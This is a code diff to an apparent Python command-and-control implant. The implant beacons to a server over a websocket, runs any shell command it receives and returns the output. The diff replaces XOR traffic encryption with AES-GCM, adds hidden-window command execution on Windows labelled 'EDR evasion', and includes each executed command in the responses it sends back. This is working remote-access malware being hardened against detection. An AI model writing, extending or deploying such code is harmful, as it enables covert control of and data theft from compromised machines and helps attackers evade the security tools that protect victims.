@@ -22,19 +22,35 @@ BEACON_INTERVAL = {{BEACON_INTERVAL}}
 BEACON_JITTER = {{BEACON_JITTER}}  # Percentage (0-100)
 
 
-def simple_encrypt(data: str) -> str:
-    """XOR encryption"""
-    key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode('latin-1')
-    encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
-    return base64.b64encode(encrypted).decode()
+def _derive_aes_key(key):
+    import hashlib
+    return hashlib.sha256(key).digest()
 
+def simple_encrypt(data: str) -> str:
+    key = b'{{ENCRYPTION_KEY}}'
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        aes_key = _derive_aes_key(key)
+        nonce = os.urandom(12)
+        ct = AESGCM(aes_key).encrypt(nonce, data.encode('utf-8'), None)
+        return base64.b64encode(b'AES1' + nonce + ct).decode()
+    except ImportError:
+        encoded = data.encode('latin-1')
+        encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
+        return base64.b64encode(encrypted).decode()
 
 def simple_decrypt(data: str) -> str:
-    """XOR decryption"""
     key = b'{{ENCRYPTION_KEY}}'
-    decoded = base64.b64decode(data.encode())
-    decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+    raw = base64.b64decode(data.encode())
+    if raw[:4] == b'AES1':
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            aes_key = _derive_aes_key(key)
+            pt = AESGCM(aes_key).decrypt(raw[4:16], raw[16:], None)
+            return pt.decode('utf-8')
+        except Exception:
+            pass
+    decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(raw))
     return decrypted.decode('latin-1')
 
 
@@ -66,21 +82,29 @@ def get_metadata():
 
 
 def execute_command(command: str) -> str:
-    """Execute system command and return output"""
+    """Execute system command with EDR evasion"""
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
             os.chdir(directory)
             return f"Changed directory to {os.getcwd()}"
 
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=30,
-            cwd=os.getcwd()
-        )
+        if sys.platform == 'win32':
+            CREATE_NO_WINDOW = 0x08000000
+            parts = command.split()
+            try:
+                result = subprocess.run(parts, capture_output=True, text=True,
+                                         timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+                output = result.stdout + result.stderr
+                if output.strip():
+                    return output
+            except (FileNotFoundError, OSError):
+                pass
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+        else:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd())
 
         output = result.stdout + result.stderr
         return output if output else "Command executed successfully (no output)"
@@ -281,7 +305,8 @@ async def connect_to_server():
 
                                 response = {
                                     'type': 'response',
-                                    'output': output
+                                    'output': output,
+                                    'command': command
                                 }
                                 encrypted_response = simple_encrypt(json.dumps(response))
                                 await websocket.send(encrypted_response)
